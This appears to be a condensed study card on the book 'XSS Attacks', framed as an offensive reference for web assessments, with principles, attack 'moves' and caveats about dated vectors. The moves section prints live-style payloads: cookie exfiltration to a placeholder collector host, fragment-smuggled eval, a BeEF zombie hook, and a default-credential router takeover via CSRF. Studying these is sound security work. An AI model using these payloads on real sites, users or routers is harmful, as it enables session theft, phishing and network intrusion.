# 15. XSS Attacks

**ISBN** 9780080553405  |  **Lobe** offensive

> The client-tier injection bible: reach for it to weaponize the browser as a pivot platform, chaining XSS + CSRF + non-HTML carriers into credential theft, intranet/router takeover, and zombie-control C2.

## Reach for this when

- Assessing any web UI in the AI-infra survey set where a reflected/stored/DOM-based injection point could pivot an authenticated operator into their own intranet or admin panel (the browser-as-bridge thesis directly maps to console-on-default LLM dashboards).
- A target echoes user input and you need the fastest filter-recon: drop the probe string and diff View Source to map which metacharacters survive before building the real payload.
- You have a low-severity client bug (autofill, predictable session ID, GET-based functional endpoint) and need to argue composability into a critical chain rather than dismissing it.
- Hunting non-obvious injection points: a scanner's HTML report, a Windows share name, a favicon/image, a Flash/PDF embed, a TinyURL-style redirector, anywhere attacker text reaches a rendering context.
- Studying the failure modes of browser-driving agents and multi-agent C2: Chapter 7 (AttackAPI/BeEF/XSS-Proxy) is the conceptual ancestor of LLM browser agents and zombie polling channels.
- Building a JS-bundle / SPA secret-extraction or DOM-sink analysis primitive and you need the canonical sink taxonomy (location.hash into eval/document.write/innerHTML).

## Principles

- No client-side data is ever trustable: forms, Flash, Java, executables, wireless packets, registry, URLs, file:// origins. The text capitalizes it: 'IT IS NEVER SECURE.' Blacklist filtering almost always loses; only whitelist input filtering plus context-correct output encoding at the server wins.
- XSS is a trust-bridge attack, not a popup nuisance. Injected JavaScript inherits the victim's network position, credentials, and same-origin reach, so the browser becomes a pivot into the trusted intranet from the hostile Internet.
- The chain is always worse than the sum: password-manager autofill alone is harmless, an XSS hole alone is harmless, together they auto-exfiltrate stored creds. The class of mistake is composability of low-severity issues.
- Injection contexts and carriers are plural, not just form fields: attribute/tag/script/CSS/URL contexts times non-HTML carriers (Flash getURL, PDF #javascript:, QuickTime HREFTrack, GIF89a, share names, Airpwn packets). Map the full carrier set before concluding 'no XSS here'.
- DOM-based XSS evades server-side filters entirely: the payload can travel in the fragment (location.hash) and never reach the server, so a clean WAF log proves nothing about client-side sinks.
- Control channels get built insecure: XSS-Proxy/BeEF/AttackAPI keep state in memory only and require no attacker auth, so anyone can hijack the hijacker. The same no-auth-on-control-channel mistake recurs in modern agent infra.

## Moves

- Filter recon: inject ;!--\"<XSS>=&{()} then grep View Source to see which of quote/angle/comment/special chars the filter neutralizes, before crafting the real vector.
- Canonical cookie exfil: "><SCRIPT>var img=new Image();img.src="http://collector/"+document.cookie;</SCRIPT> and the cross-browser getXHR() factory (XMLHttpRequest -> createRequest -> Msxml2.XMLHTTP -> Microsoft.XMLHTTP).
- DOM length-bypass: "><script>eval(location.hash.substr(1))</script>#payload to smuggle an arbitrary-length payload past server filters via the fragment.
- WAF/mod_security evasion: String.fromCharCode decimal obfuscation (60=<, 62=>), HTML-entity permutations, UTF-7 / US-ASCII / BIG5 / SHIFT_JIS variable-width charset tricks, CSS expression() and -moz-binding, data: base64 URIs, the </scr"+"ipt> split to dodge premature parser termination.
- Page repaint / phishing: document.getElementById('ContentWhole'|'content'|'rightcol').innerHTML overwrite to inject a spoofed login or phishing iframe in-origin.
- JSON hijacking: override the Array() constructor to capture a same-origin JSON response (Grossman's GMail-contacts theft) and read it cross-domain.
- Drive-by-pharming: requestCSRF POST to http://admin:admin@<gateway>/setup.cgi with remote_management=enable, deriving the gateway by swapping the last IP octet for .1 (default-cred Linksys, opens port 8080 on WAN).
- Browser internal recon: getInternalIP via Java/LiveConnect, script/img-tag port scanning with window.stop() and timeout tuning, sweepPorts over range/CIDR (note: Firefox/Opera block ports below 80, IE does not).
- Inbox snarfing: invisible cols='0,*,0' frameset, setTimeout-staged message loads, suckURL pulls innerHTML, escape()-encode and auto-POST to collector (the Cingular Xpress Mail Snarfer with 8000ms timers).
- file:// share traversal under an admin victim: file://///IP/share and file://///IP/C$ to read mapped and hidden admin shares across domain hosts (Sage RSS + XSS-Proxy).
- Zombie hook: "><script src=http://[BeEF]/beef/hook/beefmagic.js.php> with autorun (alert/deface) and standard modules (steal_clipboard, visited_urls, request); inter-protocol exploit fires a multipart POST at Asterisk 1.0.7 Manager on port 5038 for a bindshell on 4444.
- Payload compression to fit URL/length limits: Dean Edwards JS packer plus the GNUCITIZEN Atom database (the TinyURL persistent-0day technique that hosts script on TinyURL's own infrastructure).

## Watch out

- 2007-vintage: specific versions (Pocket IE 4.2, PDF Reader <7.9, Firefox password-manager autofill, Linksys admin:admin, UTF-7 auto-detection, Flash getURL) are largely patched or mitigated by CSP, HttpOnly cookies, SameSite, X-Frame-Options, and modern same-origin hardening. Reach for the structural lessons (carrier plurality, chaining, trust-bridge), not the literal vectors, against current targets.
- This extraction stops at the end of Chapter 7. The XSS-worm propagation math (Linear/Warhol/Exponential, Samy Is My Hero), Chapter 9 Prevention, and Appendix A The Owned List exist only as TOC lines and forward-references. Source worm-propagation and the full prevention chapter elsewhere; do not cite them as if synthesized from body text.
- Defense coverage is thin in what was extracted: the durable-defense statements (whitelist input filtering, output encoding, weak client-side mitigations) are correct but underspecified compared to a modern CSP/Trusted-Types treatment. Do not treat this book as your remediation reference.
- Browser port-scan and DNS-pinning escalation results are noisy and browser-version-dependent (port-block lists, anti-DNS-pinning ladder); treat outputs as candidates needing the verification stage, not findings. A clean WAF log never refutes a DOM-based sink.
- The frameworks (BeEF/XSS-Proxy/AttackAPI) themselves ship with no auth on the control channel and memory-only state. Useful as study artifacts, but do not deploy the period tooling live; the lesson is the failure mode, not the binary.
